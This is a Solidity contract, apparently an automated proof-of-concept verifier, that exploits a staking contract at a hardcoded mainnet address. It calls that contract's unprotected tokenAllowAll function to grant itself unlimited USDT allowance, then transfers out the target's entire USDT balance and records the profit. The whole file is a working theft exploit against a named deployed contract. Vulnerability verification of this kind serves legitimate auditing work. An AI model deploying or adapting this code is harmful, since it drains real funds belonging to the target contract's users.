// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IUSDTStakingContract28 {
    function tokenAllowAll(address asset, address allowee) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x800cfD4A2ba8CE93eA2cc814Fce26c3635169017;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    uint256 private _profitAmount;

    constructor() {}

    function executeOnOpportunity() external {
        IERC20Like usdt = IERC20Like(USDT);

        uint256 attackerUsdtBefore = usdt.balanceOf(address(this));
        uint256 targetUsdtBalance = usdt.balanceOf(TARGET);
        require(targetUsdtBalance > 0, "no USDT in target");

        // exploit_paths[0]: Attacker calls `tokenAllowAll(USDT, attacker)`.
        // The verifier contract is the attacker and uses the public function directly.
        IUSDTStakingContract28(TARGET).tokenAllowAll(USDT, address(this));

        // exploit_paths[1]: The contract grants the attacker unlimited USDT allowance.
        uint256 grantedAllowance = usdt.allowance(TARGET, address(this));
        require(grantedAllowance >= targetUsdtBalance, "allowance not granted");

        // exploit_paths[2]: Attacker calls
        // `USDT.transferFrom(address(contract), attacker, USDT.balanceOf(address(contract)))`
        // to drain the pool.
        _safeTransferFrom(USDT, TARGET, address(this), targetUsdtBalance);

        uint256 attackerUsdtAfter = usdt.balanceOf(address(this));
        require(attackerUsdtAfter > attackerUsdtBefore, "no profit realized");

        _profitAmount = attackerUsdtAfter - attackerUsdtBefore;
    }

    function profitToken() external pure returns (address) {
        return USDT;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _safeTransferFrom(address token, address from, address to, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(bytes4(keccak256("transferFrom(address,address,uint256)")), from, to, amount));
        require(ok, "transferFrom call failed");
        if (data.length > 0) {
            require(abi.decode(data, (bool)), "transferFrom returned false");
        }
    }
}
